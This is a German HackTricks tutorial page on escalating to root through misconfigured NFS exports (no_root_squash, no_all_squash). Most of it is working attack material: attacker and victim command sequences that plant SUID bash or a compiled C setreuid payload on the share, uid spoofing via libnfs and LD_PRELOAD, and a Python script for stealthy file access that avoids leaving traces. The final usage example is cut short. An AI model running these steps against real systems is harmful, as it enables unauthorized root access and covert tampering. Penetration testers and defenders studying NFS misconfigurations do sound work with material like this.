{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Lese die _ **/etc/exports** _ Datei. Wenn du ein Verzeichnis findest, das als **no\_root\_squash** konfiguriert ist, kannst du **darauf zugreifen** **als Client** und **in dieses Verzeichnis schreiben**, **als ob** du der lokale **root** der Maschine wärst.

**no\_root\_squash**: Diese Option gibt im Grunde dem root-Benutzer auf dem Client die Berechtigung, Dateien auf dem NFS-Server als root zuzugreifen. Und das kann zu ernsthaften Sicherheitsproblemen führen.

**no\_all\_squash:** Dies ist ähnlich wie die Option **no\_root\_squash**, gilt jedoch für **Nicht-Root-Benutzer**. Stell dir vor, du hast eine Shell als Benutzer nobody; hast die /etc/exports Datei überprüft; die Option no\_all\_squash ist vorhanden; überprüfe die /etc/passwd Datei; emuliere einen Nicht-Root-Benutzer; erstelle eine SUID-Datei als dieser Benutzer (indem du NFS verwendest). Führe die SUID als Benutzer nobody aus und werde ein anderer Benutzer.

# Privilegieneskalation

## Remote Exploit

Wenn du diese Schwachstelle gefunden hast, kannst du sie ausnutzen:

* **Montiere dieses Verzeichnis** auf einer Client-Maschine und **kopiere als root** die **/bin/bash** Binärdatei in den gemounteten Ordner und gib ihr **SUID**-Rechte, und **führe von der Opfer**-Maschine diese Bash-Binärdatei aus.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Das Verzeichnis** auf einem Client-Rechner einbinden und **als root** unser kompiliertes Payload, das die SUID-Berechtigung ausnutzt, in den eingebundenen Ordner kopieren, ihm **SUID**-Rechte geben und **von der Opfer**-Maschine diese Binärdatei ausführen (hier finden Sie einige [C SUID-Payloads](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Lokaler Exploit

{% hint style="info" %}
Beachten Sie, dass Sie, wenn Sie einen **Tunnel von Ihrem Rechner zum Zielrechner erstellen können, die Remote-Version weiterhin verwenden können, um diese Privilegieneskalation durch Tunneln der erforderlichen Ports auszunutzen**.\
Der folgende Trick gilt, falls die Datei `/etc/exports` **eine IP angibt**. In diesem Fall **werden Sie auf keinen Fall** die **Remote-Exploit** verwenden können und müssen **diesen Trick ausnutzen**.\
Eine weitere erforderliche Bedingung, damit der Exploit funktioniert, ist, dass **der Export in `/etc/export`** **das `insecure`-Flag verwenden muss**.\
\--_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--
{% endhint %}

## Grundinformationen

Das Szenario beinhaltet das Ausnutzen eines gemounteten NFS-Teils auf einem lokalen Rechner, wobei eine Schwachstelle in der NFSv3-Spezifikation ausgenutzt wird, die es dem Client ermöglicht, seine uid/gid anzugeben, was potenziell unbefugten Zugriff ermöglicht. Der Exploit beinhaltet die Verwendung von [libnfs](https://github.com/sahlberg/libnfs), einer Bibliothek, die das Fälschen von NFS-RPC-Aufrufen ermöglicht.

### Kompilieren der Bibliothek

Die Schritte zur Kompilierung der Bibliothek können je nach Kernelversion Anpassungen erfordern. In diesem speziellen Fall wurden die fallocate-Systemaufrufe auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Durchführung des Exploits

Der Exploit besteht darin, ein einfaches C-Programm (`pwn.c`) zu erstellen, das die Berechtigungen auf root erhöht und dann eine Shell ausführt. Das Programm wird kompiliert, und die resultierende Binärdatei (`a.out`) wird mit suid root auf dem Share platziert, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:

1. **Kompilieren Sie den Exploit-Code:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Platzieren Sie den Exploit auf dem Share und ändern Sie seine Berechtigungen, indem Sie die uid fälschen:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Führen Sie den Exploit aus, um root-Rechte zu erlangen:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell für stealthy Datei-Zugriff
Sobald root-Zugriff erlangt wurde, wird ein Python-Skript (nfsh.py) verwendet, um mit dem NFS-Share zu interagieren, ohne den Besitz zu ändern (um keine Spuren zu hinterlassen). Dieses Skript passt die uid an die des zuzugreifenden Files an, sodass die Interaktion mit Dateien auf dem Share ohne Berechtigungsprobleme möglich ist:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Führen Sie aus wie:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
